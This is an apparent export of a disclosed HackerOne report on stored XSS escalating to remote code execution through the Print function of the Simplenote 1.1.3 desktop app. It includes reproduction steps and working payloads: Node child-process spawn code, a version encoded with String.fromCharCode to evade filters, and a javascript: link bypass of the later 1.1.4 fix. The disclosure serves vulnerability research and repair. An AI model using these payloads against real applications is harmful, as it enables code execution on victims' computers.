{"id":358049,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTgwNDk=","url":"https://hackerone.com/reports/358049","title":"RCE via Print function [Simplenote 1.1.3 - Desktop app] ","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-05-27T09:33:36.011Z","submitted_at":"2018-05-27T09:33:36.011Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"luigigubello","url":"/luigigubello","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":111,"url":"https://hackerone.com/automattic","handle":"automattic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Automattic","twitter_handle":"","website":"https://automattic.com","about":"WordPress.com, VaultPress, Akismet, Gravatar, WooCommerce, Polldaddy, Tumblr and more!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-07-26T08:26:07.139Z","bug_reporter_agreed_on_going_public_at":"2018-06-26T08:26:03.226Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"In **Simplenote 1.1.3 - Desktop app** there is a stored XSS vulnerability that can be used to execute arbitrary code. If there is malicious code in the note and the user tries to print it (for example to save it as a PDF), the malicious code runs.\n\nThis report is based on the [report **#291539**](https://hackerone.com/reports/291539), by Yasin Soliman (ysx). I used his code to pass from XSS to RCE.\n\n# Step to reproduce\n\n## 1 - Prerequisites\n\n- Download and install Simplenote 1.1.3 Desktop app (I use Debian, but I think the problem is present on all desktop versions)\n- Markdown must **not** be enabled\n\n## 2 - Stored XSS\n\nCreate a new note, and you write this text:\n```\n\"\u003e'\u003e\u003cdetails/open/ontoggle=confirm('XSS')\u003e\n```\nNow go to **File** --\u003e **Print**. An alert box appears, so there is a XSS vulnerability and the code runs when the user tries to print the note.\n\n## 3 - From XSS to RCE\n\nThanks to [**ysx**] (https://hackerone.com/ysx), I used the code in his proof-of-concept.\nThe code to open the Gnome calculator in Debian is:\n\n```\nvar Process = process.binding('process_wrap').Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+'='+env[key]);\nproc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});\n```\n\nNow you use the functions `writeln()` and `String.fromCharCode()` to bypass possible filters. So you [encode] (https://www.martineve.com/2007/05/15/javascript-eval-string-fromcharcode-encoder) the script into unicode values. Now you can create the payload:\n\n```\n\"\u003e'\u003e\u003cimg src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))\u003e\n```\n\nYou write it in a note, then you print it (or save like pdf). The Gnome calculator will open.\n\nI have attached two screenshots and a proof-of-concept video.\n\n## Impact\n\nAn attacker can create a note with malicious code. Then he can share it with the victim, asking to print it or save it in pdf (it may be useful to have a pdf file) so the code is executed on the victim's computer.","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":302301,"file_name":"simplenote_rce_screen.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/301/bf86f47e8f3e6b6bdab6fd0ee2e35dba0d8ed32c/simplenote_rce_screen.png?response-content-disposition=attachment%3B%20filename%3D%22simplenote_rce_screen.png%22%3B%20filename%2A%3DUTF-8%27%27simplenote_rce_screen.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145009Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e400fea09ac0aa96ec1efe851f4571bf5f171ed621d8361763e18147144d8bb9","file_size":458022,"type":"image/png"},{"id":302302,"file_name":"simplenote_rce_poc.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/302/2c46c8d847b2d0372cd7cdbf672722b2ac042502/simplenote_rce_poc.mp4?response-content-disposition=attachment%3B%20filename%3D%22simplenote_rce_poc.mp4%22%3B%20filename%2A%3DUTF-8%27%27simplenote_rce_poc.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145009Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d212bfbacfae5aa55e7f2fc29071f1444130cd5e9fdf3fca50a95a441f7db64e","file_size":3254525,"type":"video/mp4"},{"id":302303,"file_name":"simplenote_rce_screen2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/303/499be97b185aca85e2a88a6310183a460cbe7c0f/simplenote_rce_screen2.png?response-content-disposition=attachment%3B%20filename%3D%22simplenote_rce_screen2.png%22%3B%20filename%2A%3DUTF-8%27%27simplenote_rce_screen2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145009Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e7a2206b2603e22ffdf7739cb254098264770616834b0798450d31e59eac0722","file_size":516985,"type":"image/png"}],"allow_singular_disclosure_at":"2018-07-26T08:26:03.366Z","allow_singular_disclosure_after":-101370246.31478277,"singular_disclosure_allowed":true,"vote_count":26,"voters":["muon4","ahiezer","geeknik","superman85","eveeez","an0nym0us","apapedulimu","bountyoverflow","naategh","zdkano","and 16 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2803154,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-05-27T09:33:56.733Z","updated_at":"2018-05-27T09:33:56.733Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":159968},"actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2803207,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It is possible to use a shorter payload:\n`\u003cscript\u003erequire('child_process').exec('/usr/bin/gnome-calculator',function(){})\u003c/script\u003e`\n\nThen you use `writeln()` and `String.FromCharcode()`. The final payload is:\n`\"\u003e'\u003e\u003cdetails/open/ontoggle=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,40,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,102,117,110,99,116,105,111,110,40,41,123,125,41,60,47,115,99,114,105,112,116,62))\u003e`","automated_response":false,"created_at":"2018-05-27T10:57:47.869Z","updated_at":"2018-05-27T10:57:47.869Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2806324,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report @luigigubello! I remember noticing this a little while ago, but looks like a follow-up PR didn't happen to actually fix it. This report is a great reminder to get it fixed asap!\n\nhttps://github.com/Automattic/simplenote-electron/pull/724#discussion_r174950892","automated_response":false,"created_at":"2018-05-28T15:57:08.664Z","updated_at":"2018-05-28T15:57:08.664Z","actor":{"username":"roundhill","cleared":false,"url":"/roundhill","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NevzyvKRwqeqKntLoUg1mLfh/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2806357,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @roundhill \nI think you should fix. I did not know the topic on Github, but this vulnerability is an RCE. I hope you will fix this bug soon :) do you want to triage this report?","automated_response":false,"created_at":"2018-05-28T16:07:19.854Z","updated_at":"2018-05-28T16:07:19.854Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2806364,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, working on it now. Thanks again.","automated_response":false,"created_at":"2018-05-28T16:16:38.196Z","updated_at":"2018-05-28T16:16:38.196Z","actor":{"username":"roundhill","cleared":false,"url":"/roundhill","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NevzyvKRwqeqKntLoUg1mLfh/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2806370,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good work :)\n\nBest  regards","automated_response":false,"created_at":"2018-05-28T16:19:24.848Z","updated_at":"2018-05-28T16:19:24.848Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2844796,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi :)\n\nAny news about the fix?","automated_response":false,"created_at":"2018-06-05T15:26:25.687Z","updated_at":"2018-06-05T15:26:25.687Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2884111,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @luigigubello, the 1.1.4 update contains the fix for this issue. Can you please confirm?\n\nDetails here: https://github.com/Automattic/simplenote-electron/pull/766","automated_response":false,"created_at":"2018-06-14T16:10:52.066Z","updated_at":"2018-06-14T16:10:52.066Z","actor":{"username":"roundhill","cleared":false,"url":"/roundhill","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NevzyvKRwqeqKntLoUg1mLfh/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2884112,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2018-06-14T16:11:08.070Z","updated_at":"2018-06-14T16:11:08.070Z","actor":{"username":"roundhill","cleared":false,"url":"/roundhill","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NevzyvKRwqeqKntLoUg1mLfh/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2886149,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @roundhill ,\n\nThe fix in Simplenote **1.1.4** is good, but there is still a little bug that allows to execute code. I have attached a proof-of-concept video. \n\n### Step to reproduce\n\n* You paste this code in Simplenote 1.1.4 with **enabled** Markdown\n\n```\n\u003ca href=\"javascript:require('child_process').exec('/usr/bin/gnome-calculator',function(){});\"\u003eCLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME CLICK ME \u003c/a\u003e\n```\n* Now you **enable** the Preview\n* Go to Print and, when the window to print appears, you click on *CLICK ME*\n* Gnome Calculator runs\n\nSo, maybe you want to fix this little bug too. However, it is difficult to make a RCE in this way.\n\n\n","automated_response":false,"created_at":"2018-06-14T20:41:36.535Z","updated_at":"2018-06-14T20:56:06.628Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":309009,"filename":"simplenote_rce_2.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/309/009/ac199962f8b5f5045a368af1ef7e4712e2f7e2e1/simplenote_rce_2.mp4?response-content-disposition=attachment%3B%20filename%3D%22simplenote_rce_2.mp4%22%3B%20filename%2A%3DUTF-8%27%27simplenote_rce_2.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145009Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=34f265f7bda7441ada28a02ecacf1c4addd6ae213a5959943947b1568dfb204e"}],"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2886822,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I tried to look at the source code, but I do not understand where the bug is. In [your fix](https://github.com/Automattic/simplenote-electron/commit/35c816eba4637282e0d0adddd696b3c3b142c69f) I read (*line 232-233*)\n ```\n+              dangerouslySetInnerHTML={{\n+                __html: renderNoteToHtml(content),\n ```\n\n**renderNoteToHtml** is in these two files: [here](https://github.com/Automattic/simplenote-electron/blob/master/lib/utils/render-note-to-html.js) and [here](https://github.com/Automattic/simplenote-electron/blob/master/lib/utils/sanitize-html.js).\n\nIn **sanitize-html.js** there is the code:\n ```\n      // only valid http(s) URLs are allowed\n      if (('href' === name || 'src' === name) \u0026\u0026 validUrl.isWebUri(value)) {\n        return false;\n      }\n ```\nSo **href=\"javascript:alert(1)\"** should not work. Indeed in the Preview it doesn't work, but it works in the print moment. Another strange thing: **href=\"javascript:alert(1)\"** runs, but **href=\"javascript:write(1)\"** does not seem to run.\n\nI'm curious to understand the problem in the code.\nThank you.","automated_response":false,"created_at":"2018-06-15T01:31:54.410Z","updated_at":"2018-06-15T01:31:54.410Z","actor":{"username":"luigigubello","cleared":false,"url":"/luigigubello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2900985,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @roundhill , \n\nDo you confirm the bug?\n\nBest 